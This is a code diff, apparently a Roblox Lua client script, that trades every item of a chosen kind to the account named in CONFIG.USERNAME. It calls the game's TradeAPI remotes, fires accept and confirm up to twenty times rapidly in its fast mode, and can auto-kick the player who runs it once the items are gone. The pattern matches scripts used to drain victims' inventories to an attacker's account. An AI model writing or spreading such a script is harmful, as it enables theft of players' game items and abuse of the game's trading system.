+local function acceptTrade()
+    pcall(function()
+        ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptTradeRequest"):FireServer()
+    end)
+end
+
+local function confirmTrade()
+    pcall(function()
+        ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer({})
+    end)
+end
+
+-- ============================================
+-- MAIN TRADING LOGIC
+-- ============================================
+local function tradeAllItems(username, itemName, category)
+    print(string.format("\n🎯 Trading ALL: %s", itemName))
+    
+    -- Resolve item
+    local itemKind, itemData = resolveItem(itemName, category)
+    if not itemKind then
+        print("❌ Could not resolve item: " .. itemName)
+        return false
+    end
+    
+    -- Get category info
+    local actualCategory = itemData.category or category or "pets"
+    local categoryPrefix = getCategoryPrefix(itemKind)
+    
+    print(string.format("📦 Item: %s", itemName))
+    print(string.format("📁 Category: %s (prefix: %s_)", actualCategory, categoryPrefix))
+    
+    -- Get ALL items
+    local allItems = getAllItems(itemKind, actualCategory)
+    local totalItems = #allItems
+    
+    print(string.format("✅ Found %d items to trade", totalItems))
+    
+    if totalItems == 0 then
+        print("⚠️ No items found!")
+        return false
+    end
+    
+    local totalTraded = 0
+    local tradeCount = 0
+    
+    while totalTraded < totalItems do
+        tradeCount = tradeCount + 1
+        print(string.format("\n--- Trade #%d ---", tradeCount))
+        
+        -- Find player
+        local targetPlayer = findPlayer(username)
+        while not targetPlayer do
+            print("⏳ Waiting for player...")
+            task.wait(5)
+            targetPlayer = findPlayer(username)
+        end
+        
+        -- Request trade
+        print("📤 Requesting trade...")
+        while not requestTrade(targetPlayer) do
+            task.wait(1)
+        end
+        task.wait(2)
+        
+        -- Open GUI
+        print("🖥️ Opening trade GUI...")
+        while not openTradeGUI() do
+            task.wait(10)
+        end
+        task.wait(2)
+        
+        -- Add items (max 4 per trade)
+        local neededThisTrade = math.min(4, totalItems - totalTraded)
+        print(string.format("➕ Adding %d items...", neededThisTrade))
+        
+        local addedCount = 0
+        for i = totalTraded + 1, totalTraded + neededThisTrade do
+            if allItems[i] then
+                if addItemToTrade(allItems[i], categoryPrefix) then
+                    addedCount = addedCount + 1
+                    if not CONFIG.NORMAL_MODE then
+                        task.wait(0.2)
+                    else
+                        task.wait(3)
+                    end
+                end
+            end
+        end
+        
+        print(string.format("✅ Added %d items", addedCount))
+        
+        -- Accept & Confirm
+        task.wait(2)
+        print("✅ Accepting trade...")
+        
+        if CONFIG.NORMAL_MODE then
+            acceptTrade()
+            task.wait(20)
+            confirmTrade()
+            task.wait(5)
+        else
+            for i = 1, 20 do
+                acceptTrade()
+                confirmTrade()
+                task.wait(0.1)
+            end
+            task.wait(3)
+        end
+        
+        totalTraded = totalTraded + addedCount
+        print(string.format("📊 Progress: %d/%d", totalTraded, totalItems))
+    end
+    
+    print(string.format("✅ COMPLETE! Traded all %d items", totalTraded))
+    return true
+end
+
+-- ============================================
+-- EXECUTE TRADES
+-- ============================================
+
+for _, item in ipairs(itemsList) do
+    tradeAllItems(CONFIG.USERNAME, item.ITEM_NAME, item.CATEGORY)
+    task.wait(2)
+end
+
+-- ============================================
+-- CLEANUP
+-- ============================================
+
+if CONFIG.AUTO_KICK then
+    print("\n🔴 Auto-kick enabled - Kicking in 5s...")
+    task.wait(5)
+    LocalPlayer:Kick("Trading complete!")
+end
+
+print("\n✅ ALL TRADES COMPLETE!")
